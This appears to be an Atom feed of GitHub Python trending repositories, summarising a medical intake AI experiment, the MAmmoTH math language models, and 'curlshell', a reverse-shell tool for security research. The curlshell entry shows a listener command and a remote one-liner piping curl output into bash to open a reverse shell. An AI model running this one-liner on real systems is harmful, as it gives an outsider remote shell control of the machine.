<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-09-25T01:38:13Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>daveshap/Medical_Intake</title>
    <updated>2023-09-25T01:38:13Z</updated>
    <id>tag:github.com,2023-09-25:/daveshap/Medical_Intake</id>
    <link href="https://github.com/daveshap/Medical_Intake" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Automated pipeline for medical intake, diagnosis, tests, etc.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Medical Intake Experiment&lt;/h1&gt; &#xA;&lt;p&gt;Automated pipeline for medical intake, diagnosis, tests, etc. Meant to be used as a clinical aid.&lt;/p&gt; &#xA;&lt;p&gt;Introductory video here: &lt;a href=&#34;https://youtu.be/EAger7jOrsA&#34;&gt;https://youtu.be/EAger7jOrsA&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Medical Device Disclaimer&lt;/h1&gt; &#xA;&lt;p&gt;This software, found under this repository and licensed under the MIT license, is an experimental project and is NOT a medical device. It is not intended to be used as a medical device or as a substitute for professional medical advice, diagnosis, or treatment.&lt;/p&gt; &#xA;&lt;p&gt;The software is designed to test artificial intelligence&#39;s ability to perform patient intake, chart notes, and offer investigative and diagnostic aid. However, it is important to note that this software has NOT been tested, validated, or approved by the Food and Drug Administration (FDA) or any other regulatory body for medical devices.&lt;/p&gt; &#xA;&lt;p&gt;The software is provided &#34;AS IS&#34;, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in connection with the software or the use or other dealings in the software.&lt;/p&gt; &#xA;&lt;p&gt;The use of this software is purely for scientific inquiry and should not be used for diagnosing or treating health problems, or for prescribing any medication or other treatment. Always seek the advice of your physician or other qualified health provider with any questions you may have regarding a medical condition. Never disregard professional medical advice or delay in seeking it because of something you have read or interpreted from the software.&lt;/p&gt; &#xA;&lt;p&gt;By using this software, you acknowledge and agree that you understand this disclaimer and that you use the software at your own risk. If you do not agree with this disclaimer, do not use the software.&lt;/p&gt; &#xA;&lt;p&gt;This disclaimer may be updated from time to time, and it is the responsibility of the user to review and comply with the current version of the disclaimer.&lt;/p&gt; &#xA;&lt;h1&gt;Usage&lt;/h1&gt; &#xA;&lt;p&gt;It&#39;s pretty much automatic. Just fire up &lt;code&gt;chat.py&lt;/code&gt; and it will take you through the whole process. Everything will be saved out to &lt;code&gt;logs/&lt;/code&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>TIGER-AI-Lab/MAmmoTH</title>
    <updated>2023-09-25T01:38:13Z</updated>
    <id>tag:github.com,2023-09-25:/TIGER-AI-Lab/MAmmoTH</id>
    <link href="https://github.com/TIGER-AI-Lab/MAmmoTH" rel="alternate"></link>
    <summary type="html">&lt;p&gt;This repo contains the code and data for &#34;MAmmoTH: Building Math Generalist Models through Hybrid Instruction Tuning&#34;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;&lt;strong&gt;MAmmoTH&lt;/strong&gt; ü¶£&lt;/h1&gt; &#xA;&lt;p&gt;This repo contains the code, data, and models for &#34;&lt;a href=&#34;https://arxiv.org/pdf/2309.05653.pdf&#34;&gt;MAmmoTH: Building Math Generalist Models through Hybrid Instruction Tuning&lt;/a&gt;&#34;&lt;/p&gt; &#xA;&lt;div align=&#34;center&#34;&gt;&#xA;  üî• üî• üî• Check out our &#xA; &lt;a href=&#34;https://tiger-ai-lab.github.io/MAmmoTH/&#34;&gt;[Project Page]&lt;/a&gt; for more results and analysis! &#xA;&lt;/div&gt; &#xA;&lt;br&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;img src=&#34;https://raw.githubusercontent.com/TIGER-AI-Lab/MAmmoTH/main/mammoth_github.png&#34; width=&#34;80%&#34; title=&#34;Introduction Figure&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;h3&gt;Datasets and Models&lt;/h3&gt; &#xA;&lt;p&gt;Our dataset and models are all available at Huggingface.&lt;/p&gt; &#xA;&lt;p&gt;ü§ó &lt;a href=&#34;https://huggingface.co/datasets/TIGER-Lab/MathInstruct&#34;&gt;MathInstruct Dataset&lt;/a&gt;&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;   &lt;th&gt;Base Model: Llama-2&lt;/th&gt; &#xA;   &lt;th&gt;Base Model: Code Llama&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;7B&lt;/td&gt; &#xA;   &lt;td&gt;ü¶£ &lt;a href=&#34;https://huggingface.co/TIGER-Lab/MAmmoTH-7B&#34;&gt;MAmmoTH-7B&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;ü¶£ &lt;a href=&#34;https://huggingface.co/TIGER-Lab/MAmmoTH-Coder-7B&#34;&gt;MAmmoTH-Coder-7B&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;13B&lt;/td&gt; &#xA;   &lt;td&gt;ü¶£ &lt;a href=&#34;https://huggingface.co/TIGER-Lab/MAmmoTH-13B&#34;&gt;MAmmoTH-13B&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;ü¶£ &lt;a href=&#34;https://huggingface.co/TIGER-Lab/MAmmoTH-Coder-13B&#34;&gt;MAmmoTH-Coder-13B&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;34B&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;   &lt;td&gt;ü¶£ &lt;a href=&#34;https://huggingface.co/TIGER-Lab/MAmmoTH-Coder-34B&#34;&gt;MAmmoTH-Coder-34B&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;70B&lt;/td&gt; &#xA;   &lt;td&gt;ü¶£ &lt;a href=&#34;https://huggingface.co/TIGER-Lab/MAmmoTH-70B&#34;&gt;MAmmoTH-70B&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;-&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;&lt;strong&gt;Table of Contents&lt;/strong&gt;&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/TIGER-AI-Lab/MAmmoTH/main/#introduction&#34;&gt;üìå Introduction&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/TIGER-AI-Lab/MAmmoTH/main/#installation&#34;&gt;‚öôÔ∏è Installation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/TIGER-AI-Lab/MAmmoTH/main/#training-and-inference&#34;&gt;üõ†Ô∏è Training and Inference&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/TIGER-AI-Lab/MAmmoTH/main/#license&#34;&gt;üìú License&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/TIGER-AI-Lab/MAmmoTH/main/#citation&#34;&gt;üìñ Citation&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h2&gt; &#xA;&lt;p&gt;We introduce MAmmoTH ü¶£, a series of open-source large language models (LLMs) specifically tailored for general math problem-solving. The MAmmoTH models are trained on MathInstruct, a meticulously curated instruction tuning dataset that is lightweight yet generalizable. MathInstruct is compiled from 13 math rationale datasets, six of which are newly curated by this work. It uniquely focuses on the hybrid use of chain-of-thought (CoT) and program-of-thought (PoT) rationales, and ensures extensive coverage of diverse mathematical fields.&lt;/p&gt; &#xA;&lt;h2&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/h2&gt; &#xA;&lt;p&gt;Clone this repository and install the required packages:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/TIGER-AI-Lab/MAmmoTH.git&#xA;cd MAmmoTH&#xA;pip install -r requirements.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;&lt;strong&gt;Training and Inference&lt;/strong&gt;&lt;/h2&gt; &#xA;&lt;h3&gt;&lt;strong&gt;Data Loading&lt;/strong&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Run the following command to preprocess the data:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from datasets import load_dataset&#xA;&#xA;dataset = load_dataset(&#34;TIGER-Lab/MathInstruct&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;&lt;strong&gt;Quick Start&lt;/strong&gt;&lt;/h3&gt; &#xA;&lt;p&gt;To play with our model, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from transformers import pipeline&#xA;pipeline = pipeline(&#34;text-generation&#34;, &#34;TIGER-Lab/MAmmoTH-Coder-7B&#34;)&#xA;&#xA;alpaca_template = &#34;Below is an instruction that describes a task. Write a response that appropriately completes the request.\n### Instruction:\n{query}\n\n### Response:&#34;&#xA;&#xA;query = &#34;Janet&#39;s ducks lay 16 eggs per day. She eats three for breakfast every morning and bakes muffins for her friends every day with four. She sells the remainder at the farmers&#39; market daily for $2 per fresh duck egg. How much in dollars does she make every day at the farmers&#39; market?&#34;&#xA;&#xA;### By default, MAmmoTH will output the Chain-of-thought (CoT) rationale&#xA;rationale_prefix = &#34;&#34;&#xA;&#xA;### You can let MAmmoTH output Program-of-thought (PoT) rationale by simply adding&#xA;rationale_prefix = &#34; Let&#39;s write a program.&#34;&#xA;&#xA;input = alpaca_template.format(query = query + rationale_prefix)&#xA;&#xA;output = pipeline(input)[0][&#39;generated_text&#39;]&#xA;print(output)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;&lt;strong&gt;Large-scale Evaluation&lt;/strong&gt;&lt;/h3&gt; &#xA;&lt;p&gt;To replicate the experimental results in our paper, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;### For open-eneded questions, the dataset should be one of &#xA;### [&#39;gsm8k&#39;, &#39;svamp&#39;, &#39;math&#39;, &#39;numglue&#39;, &#39;deepmind&#39;, &#39;simuleq&#39;] &#xA;### We use PoT for open-eneded questions and set --stem_flan_type &#34;pot_prompt&#34;&#xA;&#xA;dataset=&#39;math&#39;&#xA;&#xA;python run_open.py \&#xA;  --model &#34;TIGER-Lab/MAmmoTH-Coder-7B&#34; \&#xA;  --shots 0 \&#xA;  --stem_flan_type &#34;pot_prompt&#34; \&#xA;  --batch_size 8 \&#xA;  --dataset $dataset \&#xA;  --model_max_length 1500 \&#xA;  --cot_backup \&#xA;  --print&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;### For mutilple-choice questions, the dataset should be one of &#xA;### [&#39;aqua&#39;, &#39;sat&#39;, &#39;mmlu_mathematics&#39;].&#xA;### We use CoT for mutilple-choice questions and set --stem_flan_type &#34;&#34;&#xA;dataset=&#39;aqua&#39;&#xA;&#xA;python run_choice.py \&#xA;  --model &#34;TIGER-Lab/MAmmoTH-Coder-7B&#34; \&#xA;  --shots 0 \&#xA;  --match_answer &#34;self&#34;&#xA;  --stem_flan_type &#34;&#34; \&#xA;  --batch_size 8 \&#xA;  --dataset $dataset \&#xA;  --print&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;&lt;strong&gt;Fine-tuning&lt;/strong&gt;&lt;/h3&gt; &#xA;&lt;p&gt;To train the 7B/13B model, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;torchrun --nproc_per_node [$WORKER_GPU] \&#xA; --master_addr [$WORKER_0_HOST] \&#xA; --node_rank [$ROLE_INDEX] \&#xA; --master_port [$WORKER_0_PORT] \&#xA; --nnodes [$WORKER_NUM] \&#xA;train.py \&#xA;    --model_name_or_path &#34;codellama/CodeLlama-7b-hf&#34; \&#xA;    --data_path &#34;TIGER-Lab/MathInstruct&#34; \&#xA;    --bf16 True \&#xA;    --output_dir checkpoints/MAmmoTH-Coder-7B \&#xA;    --num_train_epochs 3 \&#xA;    --per_device_train_batch_size 2 \&#xA;    --per_device_eval_batch_size 1 \&#xA;    --gradient_accumulation_steps 8 \&#xA;    --evaluation_strategy &#34;no&#34; \&#xA;    --save_strategy &#34;steps&#34; \&#xA;    --save_steps 2000\&#xA;    --save_total_limit 1 \&#xA;    --learning_rate 2e-5 \&#xA;    --weight_decay 0. \&#xA;    --warmup_ratio 0.03 \&#xA;    --lr_scheduler_type &#34;cosine&#34; \&#xA;    --logging_steps 1 \&#xA;    --fsdp &#34;full_shard auto_wrap&#34; \&#xA;    --fsdp_transformer_layer_cls_to_wrap &#39;LlamaDecoderLayer&#39; \&#xA;    --tf32 True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To train the 34B/70B model, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;torchrun --nproc_per_node [$WORKER_GPU] \&#xA; --master_addr [$WORKER_0_HOST] \&#xA; --node_rank [$ROLE_INDEX] \&#xA; --master_port [$WORKER_0_PORT] \&#xA; --nnodes [$WORKER_NUM] \&#xA;train.py \&#xA;    --model_name_or_path &#34;codellama/CodeLlama-34b-hf&#34; \&#xA;    --data_path &#34;TIGER-Lab/MathInstruct&#34; \&#xA;    --bf16 True \&#xA;    --output_dir checkpoints/MAmmoTH-Coder-34B \&#xA;    --num_train_epochs 3 \&#xA;    --per_device_train_batch_size 1 \&#xA;    --per_device_eval_batch_size 1 \&#xA;    --gradient_accumulation_steps 2 \&#xA;    --evaluation_strategy &#34;no&#34; \&#xA;    --save_strategy &#34;epoch&#34; \&#xA;    --save_total_limit 1 \&#xA;    --learning_rate 1e-5 \&#xA;    --weight_decay 0. \&#xA;    --warmup_ratio 0.03 \&#xA;    --lr_scheduler_type &#34;cosine&#34; \&#xA;    --logging_steps 1 \&#xA;    --deepspeed &#34;ds_config/ds_config_zero3.json&#34; \&#xA;    --tf32 True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Prompt Format&lt;/h2&gt; &#xA;&lt;p&gt;If you want to do CoT:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Below is an instruction that describes a task. Write a response that appropriately completes the request.&#xA;&#xA;### Instruction:&#xA;{instruction}&#xA;&#xA;### Response:&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you want to do PoT:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Below is an instruction that describes a task. Write a response that appropriately completes the request.&#xA;&#xA;### Instruction:&#xA;{instruction} Let&#39;s write a program.&#xA;&#xA;### Response:&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;&lt;strong&gt;License&lt;/strong&gt;&lt;/h2&gt; &#xA;&lt;p&gt;Please check out the license of each subset in our curated dataset MathInstruct.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Dataset Name&lt;/th&gt; &#xA;   &lt;th&gt;License Type&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;GSM8K&lt;/td&gt; &#xA;   &lt;td&gt;MIT&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;GSM8K-RFT&lt;/td&gt; &#xA;   &lt;td&gt;Non listed&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;AQuA-RAT&lt;/td&gt; &#xA;   &lt;td&gt;Apache 2.0&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;MATH&lt;/td&gt; &#xA;   &lt;td&gt;MIT&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;TheoremQA&lt;/td&gt; &#xA;   &lt;td&gt;MIT&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Camel-Math&lt;/td&gt; &#xA;   &lt;td&gt;Attribution-NonCommercial 4.0 International&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;NumGLUE&lt;/td&gt; &#xA;   &lt;td&gt;Apache-2.0&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;CrowdSourced (Lila)&lt;/td&gt; &#xA;   &lt;td&gt;Attribution 4.0 International&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;MathQA&lt;/td&gt; &#xA;   &lt;td&gt;Apache-2.0&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Our Curated&lt;/td&gt; &#xA;   &lt;td&gt;MIT&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;&lt;strong&gt;Citation&lt;/strong&gt;&lt;/h2&gt; &#xA;&lt;p&gt;Please cite our paper if you use our data, model or code. Please also kindly cite the original dataset papers.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;@article{yue2023mammoth,&#xA;  title={MAmmoTH: Building Math Generalist Models through Hybrid Instruction Tuning},&#xA;  author={Xiang Yue, Xingwei Qu, Ge Zhang, Yao Fu, Wenhao Huang, Huan Sun, Yu Su, Wenhu Chen},&#xA;  journal={arXiv preprint arXiv:2309.05653},&#xA;  year={2023}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>irsl/curlshell</title>
    <updated>2023-09-25T01:38:13Z</updated>
    <id>tag:github.com,2023-09-25:/irsl/curlshell</id>
    <link href="https://github.com/irsl/curlshell" rel="alternate"></link>
    <summary type="html">&lt;p&gt;reverse shell using curl&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Reverse shell using curl&lt;/h1&gt; &#xA;&lt;p&gt;During security research, you may end up running code in an environment, where establishing raw TCP connections to the outside world is not possible; outgoing connection may only go through a connect proxy (HTTPS_PROXY). This simple interactive HTTP server provides a way to mux stdin/stdout and stderr of a remote reverse shell over that proxy with the help of curl.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;Start your listener:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./curlshell.py --certificate fullchain.pem --private-key privkey.pem --listen-port 1234&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On the remote side:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;curl https://curlshell:1234 | bash&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;That&#39;s it!&lt;/p&gt;</summary>
  </entry>
</feed>